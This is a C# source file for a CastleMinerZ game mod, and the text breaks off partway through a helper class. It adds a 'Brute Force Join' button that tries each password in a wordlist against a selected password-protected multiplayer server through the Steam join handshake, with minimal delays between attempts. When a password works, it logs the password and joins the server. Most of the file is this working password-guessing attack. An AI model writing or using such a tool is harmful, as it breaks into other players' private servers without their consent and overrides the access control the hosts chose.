/*
SPDX-License-Identifier: GPL-3.0-or-later
Copyright (c) 2025 RussDev7
This file is part of https://github.com/RussDev7/CastleForge - see LICENSE for details.
*/

// #pragma warning disable IDE0060    // Silence IDE0060.
using System.Collections.Generic;
using DNA.Drawing.UI.Controls;
using Microsoft.Xna.Framework;
using DNA.Distribution.Steam;
using System.Threading.Tasks;
using DNA.Net.GamerServices;
using DNA.CastleMinerZ.UI;
using System.Diagnostics;
using System.Reflection;
using DNA.CastleMinerZ;
using System.Threading;
using DNA.Drawing.UI;
using DNA.Drawing;
using System.Linq;
using HarmonyLib;                     // Harmony patching library.
using System.IO;
using System;

using static ModLoader.LogSystem;     // For Log(...).

namespace BruteForceJoin
{
    /// <summary>
    /// All Harmony patches in one place. Using ApplyAllPatches()
    /// will scan this assembly for nested [HarmonyPatch] classes
    /// and apply them, then log exactly what got patched.
    /// </summary>
    class GamePatches
    {
        #region Patcher Initiation

        // Keep a handle to this Harmony instance so we can unpatch later.
        private static Harmony _harmony;
        private static string  _harmonyId;

        /// <summary>
        /// Best-effort Harmony bootstrap:
        /// - Scans this assembly for all classes marked with [HarmonyPatch].
        /// - All classes marked with the additional [HarmonySilent] attribute will have logging silenced.
        /// - Patches each class independently inside a try/catch (one bad target won't kill the rest).
        /// - Logs a per-class result and a final summary of methods actually patched by our Harmony ID.
        /// - Leaves your UI wiring call in place after patching.
        /// </summary>
        public static void ApplyAllPatches()
        {
            Log("[Harmony] Starting game patching.");

            // Create a stable, unique Harmony ID for this mod. Using the namespace helps avoid collisions.
            _harmonyId = $"castleminerz.mods.{typeof(GamePatches).Namespace}.patches"; // Unique ID based on namespace.
            _harmony   = new Harmony(_harmonyId);                                      // Create & store the Harmony instance.

            // Choose which assembly to scan for patch classes.
            // If you split patches across multiple assemblies, call this routine for each assembly.
            Assembly asm = typeof(GamePatches).Assembly;

            int successCount = 0;
            int failCount    = 0;

            // Enumerate every class that has at least one [HarmonyPatch] attribute,
            // and patch it independently (best-effort).
            foreach (var patchType in EnumeratePatchTypes(asm))
            {
                try
                {
                    // Create a processor for this patch class and apply all of its prefixes/postfixes/transpilers.
                    var proc    = _harmony.CreateClassProcessor(patchType);
                    var targets = proc?.Patch(); // List<MethodBase> of target methods Harmony hooked (may be null).
                    successCount++;

                    /*
                    // NOTE: Don't show silent patch containers.
                    if (!IsSilent(patchType))
                    {
                        int targetCount = targets?.Count ?? 0;
                        Log($"[Harmony] Patched {patchType.FullName} ({targetCount} target(s)).");
                    }
                    */

                    int targetCount = targets?.Count ?? 0;
                    Log($"[Harmony] Patched {patchType.FullName} ({targetCount} target(s)).");
                }
                catch (Exception ex)
                {
                    failCount++;
                    Log($"[Harmony] FAILED patching {patchType.FullName}: {ex.GetType().Name}: {ex.Message}.");
                }
            }

            // Summarize what we actually patched (filter by Owner == our Harmony ID).
            var ours = _harmony.GetPatchedMethods()
                               .Where(m =>
                               {
                                   var info = Harmony.GetPatchInfo(m);
                                   return info != null && (info.Owners?.Contains(_harmonyId) ?? false);
                               })
                               .ToList();

            // Print per-method details, but filter out any silent patches FIRST.
            foreach (var m in ours)
            {
                var info = Harmony.GetPatchInfo(m);
                if (info == null) continue;

                // Filter out silent patches before printing anything.
                var prefixes    = Filter(info.Prefixes).ToList();
                var postfixes   = Filter(info.Postfixes).ToList();
                var transpilers = Filter(info.Transpilers).ToList();

                // If nothing remains (all were silent), don't log this method at all.
                if (prefixes.Count == 0 && postfixes.Count == 0 && transpilers.Count == 0) continue;

                // Show filtered counts (not the raw/total counts).
                Log($"[Harmony] Patched method: {Describe(m)} | " +
                    $"[Prefixes={prefixes.Count}] [Postfixes={postfixes.Count}] [Transpilers={transpilers.Count}].");

                foreach (var p in prefixes)    Log($"  • Prefix    : {Describe(p.PatchMethod)}.");
                foreach (var p in postfixes)   Log($"  • Postfix   : {Describe(p.PatchMethod)}.");
                foreach (var p in transpilers) Log($"  • Transpiler: {Describe(p.PatchMethod)}.");
            }

            Log($"[Harmony] Patching complete. Success={successCount}, Failed={failCount}, MethodsPatchedByUs={ours.Count}.");
        }

        /// <summary>
        /// Unpatch everything applied by this mod's Harmony ID only
        /// (restores original game methods without touching other mods).
        /// </summary>
        public static void DisableAll()
        {
            if (_harmony != null)
            {
                Log($"[Harmony] Unpatching all ({_harmonyId}).");
                _harmony.UnpatchAll(_harmonyId);
            }
        }

        #region Silent Attribute

        /// <summary>
        /// Lets you tag a whole patch class or a single method so the patch-reporting logger will ignore it.
        /// </summary>
        [System.AttributeUsage(System.AttributeTargets.Class | System.AttributeTargets.Method, Inherited = false, AllowMultiple = false)]
        internal sealed class HarmonySilentAttribute : Attribute { };

        #endregion

        #region Patcher Helpers

        /// <summary>
        /// Return true if the method or its declaring type is marked with [HarmonySilent].
        /// </summary>
        static bool IsSilent(MemberInfo mi)
        {
            if (mi == null) return false;

            // Respect [HarmonySilent] on the member itself.
            if (mi.IsDefined(typeof(HarmonySilentAttribute), inherit: false))
                return true;

            // Respect [HarmonySilent] on declaring type.
            var dt = (mi as MethodBase)?.DeclaringType ?? mi as Type;
            if (dt != null && dt.IsDefined(typeof(HarmonySilentAttribute), inherit: false))
                return true;

            return false;
        }

        /// <summary>
        /// Filters out patches whose patch method (or its declaring type) is marked "silent".
        /// </summary>
        static IEnumerable<Patch> Filter(IEnumerable<Patch> src)
            => (src ?? Enumerable.Empty<Patch>()).Where(p => !IsSilent(p.PatchMethod));

        /// <summary>
        /// Finds all types that are Harmony patch containers in the given assembly
        /// (i.e., classes marked with [HarmonyPatch]). Using an attribute scan keeps us
        /// from trying to patch non-patch helper classes accidentally.
        /// </summary>
        private static IEnumerable<Type> EnumeratePatchTypes(Assembly asm)
        {
            // AccessTools.GetTypesFromAssembly is defensive (skips type-load failures).
            foreach (var t in AccessTools.GetTypesFromAssembly(asm))
            {
                if (t == null || !t.IsClass) continue;

                // Harmony 2.x attribute name is "HarmonyLib.HarmonyPatch".
                // Compare by FullName or simple Name to stay robust across versions/builds.
                bool hasPatchAttr = t.GetCustomAttributes(inherit: true)
                                    .Any(a => a != null &&
                                              (a.GetType().FullName == "HarmonyLib.HarmonyPatch" ||
                                               a.GetType().Name     == "HarmonyPatch"));
                if (hasPatchAttr)
                    yield return t;
            }
        }

        /// <summary>
        /// Nice method formatter for log output: TypeName.MethodName(T0, T1, ...).
        /// </summary>
        private static string Describe(MethodBase m)
        {
            if (m == null) return "(null)";
            try
            {
                string type = m.DeclaringType != null ? m.DeclaringType.FullName : "(global)";
                string pars = string.Join(", ", m.GetParameters().Select(p => p.ParameterType.Name));
                return $"{type}.{m.Name}({pars})";
            }
            catch
            {
                // Fallback if reflection blows up for any reason.
                return m.ToString();
            }
        }
        #endregion

        #endregion

        #region Buttons: Brute Force / Open Hosts Profile

        /// <summary>
        /// This class is a container for all Harmony patches that target
        /// DNA.CastleMinerZ.UI.ChooseOnlineGameScreen. The [HarmonyPatch(typeof(...))]
        /// on the class tells Harmony that any methods inside which also carry
        /// [HarmonyPatch("MethodName")] (or a TargetMethod()) apply to that type.
        /// </summary>
        [HarmonyPatch(typeof(ChooseOnlineGameScreen))]
        public static class ChooseOnlineGameScreen_BruteForcePatch
        {
            #region UI: Brute Force Join Button

            // Our two injected buttons, reused across pushes (don't recreate each frame).
            private static FrameButtonControl _bruteForceButton;
            private static FrameButtonControl _hostsProfileButton;

            // Keep a reference to the most recent ChooseOnlineGameScreen in case the click
            // handler needs to talk back to the screen (e.g., read SelectedItem).
            private static ChooseOnlineGameScreen _lastScreen;

            // The game's buttons are created with a fixed logical size (300x40)
            // and then scaled by Screen.Adjuster.ScaleFactor. We mirror that.
            private static readonly Size BaseButtonSize = new Size(300, 40);

            // --- Reflection handles for private members we need to line up properly ---

            // The "Search Again" button is a private field on ChooseOnlineGameScreen.
            // We read it so we can match frame/color and push it down below our new button.
            private static readonly FieldInfo _fiRefresh =
                AccessTools.Field(typeof(ChooseOnlineGameScreen), "_refreshButton");

            // The "Join Game" button is stored in the base ScrollingListScreen as _selectButton.
            // We reflect it so we can place our button directly beneath it and mirror scale/frame.
            private static readonly FieldInfo _fiSelect =
                AccessTools.Field(typeof(ScrollingListScreen), "_selectButton");

            // Compute the vertical gap the stock UI uses between stacked buttons.
            // The game multiplies small constants by ScaleFactor.X; we do the same.
            private static int VerticalGapPX() => (int)(5f * Screen.Adjuster.ScaleFactor.X);

            /// <summary>
            /// Positions & styles our custom buttons so they look native:
            ///   Select
            ///   BruteForce
            ///   HostsProfile
            ///   Refresh (stock, pushed down)
            /// </summary>
            private static void PlaceButtons(ChooseOnlineGameScreen screen)
            {
                if (screen == null || _bruteForceButton == null || _hostsProfileButton == null)
                    return;

                // Pull stock controls; if either missing, bail gracefully.
                if (!(_fiSelect?.GetValue(screen)  is FrameButtonControl select) ||
                    !(_fiRefresh?.GetValue(screen) is FrameButtonControl refresh))
                    return;

                // Mirror visuals from Select/Refresh so ours match perfectly.
                // (Logical Size is 300x40; actual on-screen size comes from Scale.)
                void StyleLikeStock(FrameButtonControl target)
                {
                    target.Size        = BaseButtonSize;
                    target.Scale       = select.Scale;                  // Critical for true match at any resolution.
                    target.Frame       = select.Frame ?? refresh.Frame; // Use the same 9-slice frame.
                    target.ButtonColor = refresh.ButtonColor;           // Same color used by stock buttons.
                    target.Font        = CastleMinerZGame.Instance._medFont;
                }
                StyleLikeStock(_bruteForceButton);
                StyleLikeStock(_hostsProfileButton);

                // Stack: under Select, then under our first button, then move Refresh under both.
                int gap   = VerticalGapPX();
                int x     = select.LocalPosition.X;
                int ySel  = select.LocalPosition.Y;

                int yMod1  = ySel + select.Size.Height + gap;
                _bruteForceButton.LocalPosition   = new Point(x, yMod1);

                int yMod2 = yMod1 + _bruteForceButton.Size.Height + gap;
                _hostsProfileButton.LocalPosition = new Point(x, yMod2);

                int yRef  = yMod2 + _hostsProfileButton.Size.Height + gap;
                refresh.LocalPosition = new Point(x, yRef);
            }

            // Inject our button when the screen is pushed (constructed & made active).
            // We create the button once and add it if not present, then do an initial placement
            // so it's correct on the very first frame.
            [HarmonyPostfix]
            [HarmonyPatch("OnPushed")]
            public static void OnPushed_Postfix(ChooseOnlineGameScreen __instance)
            {
                try
                {
                    if (_bruteForceButton == null)
                    {
                        _bruteForceButton = new FrameButtonControl
                        {
                            Text = "Brute Force Join",
                            Font = CastleMinerZGame.Instance._medFont,
                            // We do NOT set Size/Scale/Frame/Color/Position here-
                            // PlaceUnderSelect(...) applies those every layout pass.
                        };
                        _bruteForceButton.Pressed += BruteForceButton_Pressed; // One-time subscription.
                    }

                    if (_hostsProfileButton == null)
                    {
                        _hostsProfileButton = new FrameButtonControl
                        {
                            Text = "Open Hosts Profile In Steam",
                            // Size/Scale/Frame/Color/Pos applied in PlaceButtons()
                        };
                        _hostsProfileButton.Pressed += HostsProfileButton_Pressed;
                    }

                    // Add if not already present (avoid duplicates).
                    if (!__instance.Controls.Contains(_bruteForceButton))
                        __instance.Controls.Add(_bruteForceButton);

                    if (!__instance.Controls.Contains(_hostsProfileButton))
                        __instance.Controls.Add(_hostsProfileButton);

                    // Keep a reference for the click handler.
                    _lastScreen = __instance;

                    // Avoid a 1-frame mismatch before OnUpdate runs.
                    PlaceButtons(__instance);
                }
                catch (Exception ex)
                {
                    Log("[Patch] Error adding button: " + ex.Message);
                }
            }

            // The game reflows UI (moves/scales buttons) during OnUpdate,
            // so we mirror that by re-running our placement afterward.
            // This keeps our button aligned during resolution/scale changes.
            [HarmonyPostfix]
            [HarmonyPatch("OnUpdate")]
            public static void OnUpdate_Postfix(ChooseOnlineGameScreen __instance)
            {
                try { PlaceButtons(__instance); } catch { /* never break the UI loop */ }
            }
            #endregion

            #region Pressed Handeler

            /// <summary>
            /// Toggle handler:
            ///  - If a run is active: request cancel and restore button label
            ///  - If idle: attempt to start; on success spawn the worker task
            ///
            /// Notes:
            ///  - Uses PassManagerManager.TryBegin to avoid overlapping runs
            ///  - Updates the button text immediately for user feedback
            ///  - Worker should reset the text and call Cleanup() in its finally block
            /// </summary>
            private static void BruteForceButton_Pressed(object sender, EventArgs e)
            {
                try
                {
                    var screen = _lastScreen;
                    if (screen == null) return;

                    // Find the selected server item (must be password-protected to proceed).
                    if (!(screen.SelectedItem is ChooseOnlineGameScreen.OnlineGameMenuItem item))
                    {
                        Log("No server selected.");
                        return;
                    }
                    if (!item.NetworkSession.PasswordProtected)
                    {
                        Log("Selected server is not password protected.");
                        return;
                    }

                    // Toggle: If running, cancel. If not, start BruteForce.
                    if (BruteForceManager.IsRunning)
                    {
                        // Idempotent cancel; worker should observe token and exit.
                        BruteForceManager.RequestCancel();
                        Log("Brute-force: Request cancelled.");

                        // Immediate UI feedback; if UI must be marshaled, do so via your UI dispatcher.
                        _bruteForceButton.Text = "Brute Force Join";
                        return;
                    }

                    // Begin a new run atomically.
                    if (!BruteForceManager.TryBegin(out var token))
                        return;

                    // Update UI to reflect active state (consider marshaling to UI thread if required).
                    _bruteForceButton.Text = "Cancel Brute Force";

                    // Fire-and-forget; RunOptimiMobJoinAsync must handle:
                    //  - Token cancellation.
                    //  - Resetting the button text.
                    //  - PassManagerManager.Cleanup() in a finally block.
                    _ = Task.Run(() => RunOptimiMobJoinAsync(item, token));
                }
                catch (Exception ex)
                {
                    // Keep the UX resilient; log and continue.
                    Log("[Patch] Button click error: " + ex.Message);
                }
            }

            /// <summary>
            /// Click handler for the "Open Hosts Profile In Steam" button.
            /// Locates the currently selected server row, reads its HostSteamID,
            /// and opens the host's Steam profile using the steam:// deep link.
            /// </summary>
            private static void HostsProfileButton_Pressed(object sender, EventArgs e)
            {
                try
                {
                    var screen = _lastScreen;
                    if (screen == null) return;

                    // Get the currently highlighted server entry.
                    if (!(screen.SelectedItem is ChooseOnlineGameScreen.OnlineGameMenuItem item))
                    {
                        Log("No server selected.");
                        return;
                    }

                    // Pull the host's SteamID from the session. Some sessions won't have one
                    // (e.g., LAN/placeholder entries), or it might be zero (unknown).
                    var steamId = item.NetworkSession?.HostSteamID;
                    if (steamId == null || steamId == 0UL)
                    {
                        Log("Host SteamID unavailable.");
                        return;
                    }

                    // Build the Steam URL. This uses Steam's URI scheme which the Steam client handles.
                    var uri = "steam://url/SteamIDPage/" + steamId.ToString();
                    try
                    {
                        // Preferred: Launch via the OS shell so the steam:// protocol handler is used.
                        Process.Start(new ProcessStartInfo(uri) { UseShellExecute = true });
                    }
                    catch
                    {
                        // Fallback for older frameworks/runtimes that may not like ProcessStartInfo.
                        Process.Start(uri);
                    }
                }
                catch (Exception ex)
                {
                    // Keep the UX resilient; log and continue.
                    Log("[Patch] Button click error: " + ex.Message);
                }
            }

            /// <summary>
            /// Optional structured attempt logging helper.
            /// Pass success=null to log a neutral/in-progress result.
            /// </summary>
            private static void LogAttempt(AvailableNetworkSession session, string pwd, int attempt, bool? success = null)
            {
                try
                {
                    string server  = session?.ServerMessage ?? "<unknown>";
                    string host    = session?.HostGamertag  ?? "<unknown>";
                    string outcome = success.HasValue ? (success.Value ? "OK" : "FAIL") : "-";

                    string line =
                        $"[Attempt {attempt:D5}] server='{server}' host='{host}' pwd='{pwd}' result={outcome}";
                    Log(line);
                }
                catch { /* don't let logging kill the loop */ }
            }
            #endregion

            #region Brute Force Loop

            /// <summary>
            /// Brute-force style join probe using a wordlist:
            ///  - Streams "Wordlist.txt" (no full-file load).
            ///  - Tries each non-empty, non-comment line as a password.
            ///  - For each password: makes a fast direct connection probe.
            ///    with a minimal timeout and one quick retry on timeout.
            ///  - On success: calls JoinAfterProbeAsync to actually join.
            ///  - Tracks consecutive non-auth errors and aborts on threshold.
            ///
            /// Notes:
            ///  - Lines starting with '#' are treated as comments.
            ///  - Timeouts don't count toward the error streak (they're noisy).
            ///  - Logging is throttled to every 10 attempts.
            ///  - UI cleanup occurs in the finally block.
            /// </summary>
            private static async Task RunOptimiMobJoinAsync(
                ChooseOnlineGameScreen.OnlineGameMenuItem item,
                CancellationToken token)
            {
                try
                {
                    // Build the path to the wordlist alongside the executable.
                    // If you plan to run very large lists, consider streaming lines instead of ReadAllLines.
                    // Build the full path: <BaseDirectory>\!Mods\Test\Wordlist.txt
                    const string WordlistFileName = "Wordlist.txt";
                    var wordlistDir  = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "!Mods", "BruteForceJoin");
                    var passwordPath = Path.Combine(wordlistDir, WordlistFileName);
                    if (!File.Exists(passwordPath))
                    {
                        Log("Wordlist.txt not found!");
                        return; // Nothing to try
                    }

                    // Load and sanitize the candidate passwords:
                    //  - Trim whitespace
                    //  - Skip empty lines
                    //  - Skip comment lines beginning with '#'
                    var passwords = File.ReadAllLines(passwordPath)
                                        .Select(p => (p ?? string.Empty).Trim())
                                        .Where(p => p.Length > 0 && !p.StartsWith("#"))
                                        .ToArray();

                    Log($"Starting brute force with {passwords.Length} passwords...");

                    // Grab the session and Steam API handle needed for the probe/join flow.
                    var session = item.NetworkSession;
                    var steamAPI = GetSteamAPI();
                    if (steamAPI == null)
                    {
                        Log("Failed to access Steam API");
                        return;
                    }

                    // Attempt counters and guardrails.
                    int attempt                    = 0;   // Total passwords tried.
                    int consecutiveErrors          = 0;   // Non-auth errors in a row.
                    const int maxErrorsBeforeAbort = 3;   // Give up after this many consecutive non-auth errors.
                    const int TimeoutRetryDelayMs  = 100; // Minimal backoff on timeouts (kept tiny by design).
                    const int TimeoutMaxRetries    = 1;   // One quick retry per timeout.

                    foreach (var password in EnumeratePasswords())
                    {
                        // Respect cancellation promptly.
                        if (token.IsCancellationRequested)
                            break;

                        attempt++;

                        // Throttle progress logging (adjust cadence for noisier/quiet logs).
                        if (attempt % 10 == 0)
                            Log($"Attempt {attempt}/{passwords.Length}");

                        try
                        {
                            // Do a direct connection probe with zero extra timeout-keep it snappy.
                            // If the backend returns Timeout, we allow a very small retry window.
                            var result = await TryDirectConnectionAsync(
                                session,
                                password,
                                TimeSpan.Zero,
                                token).ConfigureAwait(false);

                            // Respect cancellation promptly.
                            if (token.IsCancellationRequested)
                                break;

                            // Minimal timeout backoff + quick retry.
                            if (result == NetworkSession.ResultCode.Timeout)
                            {
                                for (int r = 0; r < TimeoutMaxRetries && result == NetworkSession.ResultCode.Timeout; r++)
                                {
                                    // Short delay to avoid tight spinning; still minimal by design.
                                    await Task.Delay(TimeoutRetryDelayMs, token).ConfigureAwait(false);
                                    result = await TryDirectConnectionAsync(session, password, TimeSpan.Zero, token)
                                                 .ConfigureAwait(false);
                                }

                                if (result == NetworkSession.ResultCode.Timeout)
                                {
                                    // Timeouts are treated as inconclusive/noisy, so we skip without
                                    // penalizing the consecutive error counter.
                                    Log("[SteamAPI] Timeout; Skipping without increment.");
                                    continue; // Move on to next password
                                }
                            }

                            if (result == NetworkSession.ResultCode.Succeeded)
                            {
                                // We found a likely correct password; attempt the actual join.
                                Log($"SUCCESS! Password: '{password}'");

                                var ok = await JoinAfterProbeAsync(item, password, token).ConfigureAwait(false);
                                if (!ok)
                                    Log("[JoinAPI] Join failed or timed out after success probe.");

                                return; // Done.
                            }
                            else if (result == NetworkSession.ResultCode.IncorrectPassword)
                            {
                                // Expected negative: reset error streak and try the next candidate.
                                consecutiveErrors = 0;
                                continue;
                            }
                            else
                            {
                                // Any other result is a non-auth error (e.g., network hiccup, server error).
                                consecutiveErrors++;
                                Log($"Error: {result} (attempt {consecutiveErrors}/{maxErrorsBeforeAbort})");

                                if (consecutiveErrors >= maxErrorsBeforeAbort)
                                {
                                    Log("Too many errors, aborting...");
                                    break;
                                }

                                // Gentle spacing between error-bearing attempts to reduce churn.
                                await Task.Delay(1000, token).ConfigureAwait(false);
                            }
                        }
                        catch (OperationCanceledException)
                        {
                            // Propagate user/request cancellation cleanly.
                            Log("Cancellation requested; Aborting join attempts.");
                            break;
                        }
                        catch (Exception ex)
                        {
                            // Any unexpected exception increments the non-auth error streak.
                            Log($"Attempt {attempt} failed: {ex.Message}");
                            consecutiveErrors++;

                            if (consecutiveErrors >= maxErrorsBeforeAbort)
                                break;
                        }
                    }
                }
                finally
                {
                    // UI cleanup: restore button text and release the CTS.
                    // NOTE: If this is WinForms/WPF, ensure this runs on the UI thread
                    // if _ManagerButton is a UI control.
                    _bruteForceButton.Text = "Brute Force Join";
                    BruteForceManager.RequestCancel();
                }
            }

            /// <summary>
            /// Attempts to retrieve the game's active SteamWorks handle by reflecting into the
            /// NetworkSession static provider (Steam-backed in this build).
            /// Returns null if Steam isn't initialized/available or if the implementation differs.
            /// </summary>
            private static SteamWorks GetSteamAPI()
            {
                try
                {
                    // Find the *static* network-session provider instance that backs all sessions.
                    // Older builds expose it as a private field "_staticProvider"; others may have
                    // a property "StaticProvider". We try both.
                    var staticProvider =
                        typeof(NetworkSession).GetField("_staticProvider", BindingFlags.NonPublic | BindingFlags.Static)?.GetValue(null) ??
                        typeof(NetworkSession).GetProperty("StaticProvider", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static)?.GetValue(null, null);

                    // If there is no provider at all, networking is likely not initialized yet.
                    if (staticProvider == null)
                        return null;

                    var pType = staticProvider.GetType();

                    // Fast-path: many Steam implementations stash the API in a private field "_steamAPI".
                    // If present and typed as SteamWorks, use it.
                    var steamField = pType.GetField("_steamAPI", BindingFlags.NonPublic | BindingFlags.Instance);
                    if (steamField != null)
                    {
                        if (steamField.GetValue(staticProvider) is SteamWorks val) return val;
                    }

                    // Fallback: if the exact field name changed, scan *all instance fields* and return
                    // the first one that is assignable to SteamWorks.
                    var anySteamField = pType.GetFields(BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public)
                                             .FirstOrDefault(f => typeof(SteamWorks).IsAssignableFrom(f.FieldType));
                    if (anySteamField != null)
                    {
                        if (anySteamField.GetValue(staticProvider) is SteamWorks val) return val;
                    }

                    // Fallback (properties): some providers may expose the Steam handle via a property
                    // instead of a field. Scan properties and return the first SteamWorks instance found.
                    var anySteamProp = pType.GetProperties(BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public)
                                            .FirstOrDefault(pr => typeof(SteamWorks).IsAssignableFrom(pr.PropertyType));
                    if (anySteamProp != null)
                    {
                        if (anySteamProp.GetValue(staticProvider, null) is SteamWorks val) return val;
                    }

                    // Nothing matched: either we're not using the Steam provider, Steam isn't initialized,
                    // or the internal shape changed beyond these heuristics.
                    return null;
                }
                catch
                {
                    // Be conservative: Never throw from a probe helper-just report "not available".
                    return null;
                }
            }

            /// <summary>
            /// Lazily enumerates candidate passwords from a text file:
            ///  - Trims each line
            ///  - Skips empty lines
            ///  - Skips comment lines that start with '#'
            ///
            /// This streams the file with <see cref="File.ReadLines(string)"/> so the wordlist
            /// is never fully loaded into memory (good for huge lists).
            /// </summary>
            private static IEnumerable<string> EnumeratePasswords()
            {
                // Build the full path: <BaseDirectory>\!Mods\Test\Wordlist.txt
                const string WordlistFileName = "WordList.txt";
                var wordlistDir  = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "!Mods", "BruteForceJoin");
                var passwordPath = Path.Combine(wordlistDir, WordlistFileName);

                if (!File.Exists(passwordPath))
                {
                    Log($"{WordlistFileName} not found at: {passwordPath}");
                    yield break;
                }

                foreach (var raw in File.ReadLines(passwordPath))
                {
                    var line = (raw ?? string.Empty).Trim();
                    if (line.Length == 0 || line.StartsWith("#"))
                        continue;

                    yield return line;
                }
            }
            #endregion

            #region Test Password

            // Uses the provider-level async join probe to test a password against a host
            // WITHOUT driving any UI or actually completing the join.
            //
            // Returns the provider's verdict (Succeeded / IncorrectPassword / ...).
            // If Succeeded, we log a success line and immediately dispose the temp session
            // so the game doesn't transition away from the server list.
            //
            // Parameters:
            //  - available : The row you get from ChooseOnlineGameScreen (AvailableNetworkSession)
            //  - password  : Candidate password to test
            //  - extraWait : Optional extra patience on top of the default wait; TimeSpan.Zero is fine
            //  - cancel    : External cancellation token to abort the probe early
            private static async Task<NetworkSession.ResultCode> TryDirectConnectionAsync(
                AvailableNetworkSession available,
                string password,
                TimeSpan extraWait,
                CancellationToken cancel)
            {
                // Game-specific wire constants (these match what discovery uses).
                // If the game exposes these, use them so you don't accidentally mismatch.
                string gameName = CastleMinerZGame.NetworkGameName;
                int version = CastleMinerZGame.NetworkVersion;

                // A SignedInGamer is required for the join ticket. If you're not signed in yet,
                // CurrentGamer can be null and the provider will fail immediately; we bail early instead.
                var localGamer = DNA.Drawing.UI.Screen.CurrentGamer;
                if (localGamer == null)
                    return NetworkSession.ResultCode.UnknownResult;

                // Kick off a provider-level join. This creates an internal temporary NetworkSession
                // and starts the handshake on a provider thread (Steam). The returned IAsyncResult
                // carries a provider-specific state object we can inspect for the outcome.
                IAsyncResult ar = NetworkSession.BeginJoin(
                    available,             // host row we're probing
                    gameName,              // "CastleMinerZSteam"
                    version,               // 3 (in your decompiled sources)
                    password,              // candidate
                    new[] { localGamer },  // who's joining
                    callback: null,
                    asyncState: null);

                // The CastleMinerZ static provider returns this concrete state type. It contains:
                //  - Event: an AutoResetEvent that's Set() when the handshake has a result
                //  - HostConnectionResult(+String): provider's verdict (incl. IncorrectPassword)
                //  - Session: the temporary NetworkSession created for the probe
                var state = (NetworkSessionStaticProvider.BeginJoinSessionState)ar;

                // Wait for the provider to finish (or for a cancel/timeout).
                // The Steam worker thread signals state.Event when it knows the result.
                // We wait on a worker thread so we never block the game loop.
                var wait = TimeSpan.FromSeconds(16);
                if (extraWait > TimeSpan.Zero)
                    wait += extraWait;

                // If 'cancel' is triggered, signal the event so our wait breaks promptly.
                using (cancel.Register(() => state.Event.Set()))
                {
                    await Task.Run(() => state.Event.WaitOne(wait));
                }

                // Read the verdict set by the provider thread.
                var code   = state.HostConnectionResult;
                var reason = state.HostConnectionResultString; // Optional text, useful for diagnostics.

                // IMPORTANT: Do NOT call NetworkSession.EndJoin(state) here, because that would
                // complete the join (and potentially move the game into the session).
                // We only wanted to probe. Dispose the temporary session immediately so we
                // leave the game's UI/state untouched.
                try { state.Session?.Dispose(); } catch { /* swallow */ }

                // Emit a clear success line if the host accepted our password.
                // If token was terminated, do not log.
                if (code == NetworkSession.ResultCode.Succeeded && !cancel.IsCancellationRequested)
                    Log("[GHandshake] Host accepted our password.");

                // Caller uses this to decide whether to stop or keep trying.
                return code;
            }
            #endregion

            #region Join Server (Via API)

            /// <summary>
            /// After a positive password probe, hand off to the game's normal join flow
            /// (FrontEndScreen.JoinGame). We then wait for the game's own JoinCallback
            /// to signal success/failure. Returns true when the callback says success;
            /// false on failure, cancellation, or timeout.
            /// </summary>
            private static async Task<bool> JoinAfterProbeAsync(
                ChooseOnlineGameScreen.OnlineGameMenuItem item,
                string password,
                CancellationToken cancel)
            {
                // Resolve game + front end; both are required to drive the UI join path.
                var game = CastleMinerZGame.Instance;
                var fe = game?.FrontEnd;
                if (fe == null)
                {
                    Log("[SvrConnect] Join success probe passed, but FrontEnd is null.");
                    return false;
                }

                // Match the stock UX: stop host discovery before initiating the join.
                // (This mirrors what ChooseOnlineGameScreen does on click.)
                try { fe._chooseOnlineGameScreen?.ShutdownHostDiscovery(); } catch { /* best-effort */ }

                // Reflect the internal entry point: FrontEndScreen.JoinGame(AvailableNetworkSession, string).
                // We must use the same path so all UI + async wiring behaves as expected.
                var joinGame = fe.GetType().GetMethod(
                    "JoinGame",
                    BindingFlags.Instance | BindingFlags.NonPublic);
                if (joinGame == null)
                {
                    Log("[SvrConnect] Could not reflect FrontEnd.JoinGame(session, password).");
                    return false;
                }

                // Arm our waiter BEFORE we kick the join, so we won't miss the callback.
                JoinSignal.Arm();

                // Invoke the join on the main/game thread. UI/screen transitions and
                // internal services often assume main-thread execution.
                DNA.CastleMinerZ.Utils.Threading.TaskDispatcher.Instance.AddTaskForMainThread(() =>
                {
                    try
                    {
                        joinGame.Invoke(fe, new object[] { item.NetworkSession, password });
                    }
                    catch (Exception ex)
                    {
                        // If reflection/invocation fails, surface it to the awaiting caller.
                        JoinSignal.Complete(false, "invoke failed: " + ex.Message);
                    }
                });

                // Await the authoritative verdict from FrontEndScreen.JoinCallback.
                // Keep the timeout modest; this step only confirms the decision, not full world load.
                var (ok, msg) = await JoinSignal.WaitAsync(TimeSpan.FromSeconds(20), cancel)
                                                .ConfigureAwait(false);

                if (ok)
                {
                    // The game's callback declared success. From here the engine will:
                    //   - push the loading screen
                    //   - wait for terrain
                    //   - call StartGame()
                    Log("[SvrConnect] Join verified by FrontEnd.JoinCallback (Success).");
                    return true;
                }

                Log($"[SvrConnect] Join failed by FrontEnd.JoinCallback: {msg}");
                return false;
            }
            #endregion
        }

        #region Join Server Patches

        /// <summary>
        /// Hooks the game's authoritative join verdict. The game calls
        /// FrontEndScreen.JoinCallback(bool success, string message) when
        /// a join attempt finishes. We mirror that into JoinSignal so callers
        /// can await a precise yes/no without guesswork.
        /// </summary>
        [HarmonyPatch(typeof(FrontEndScreen), "JoinCallback")]
        internal static class FrontEnd_JoinCallback_Spy
        {
            // Postfix means we run after the original callback has executed.
            static void Postfix(bool success, string message)
            {
                JoinSignal.Complete(success, message);
            }
        }
        #endregion

        #endregion

        #region Helper Classes

        /// <summary>
        /// CentraliMob cancellation gate for the BruteForceJoin workflow.
        /// Thread-safe via a private lock. Exposes:
        ///  - IsRunning: true when a CTS exists and hasn't been canceled
        ///  - TryBegin: atomically creates a new CTS if not already running
        ///  - RequestCancel: idempotent cancel request
        ///  - Cleanup: disposes and nulls the CTS to avoid leaks
        ///
        /// Rationale:
        ///  - Avoids races from multiple button presses
        ///  - Ensures only one background run at a time
        ///  - Keeps cancel/dispose logic in one place
        /// </summary>
        public static class BruteForceManager
        {
            // Lock to guard CTS lifecycle transitions (create/cancel/cleanup).
            private static readonly object _gate = new object();

            // The current CTS for an active run (null when idle).
            public static CancellationTokenSource CancelSource { get; private set; }

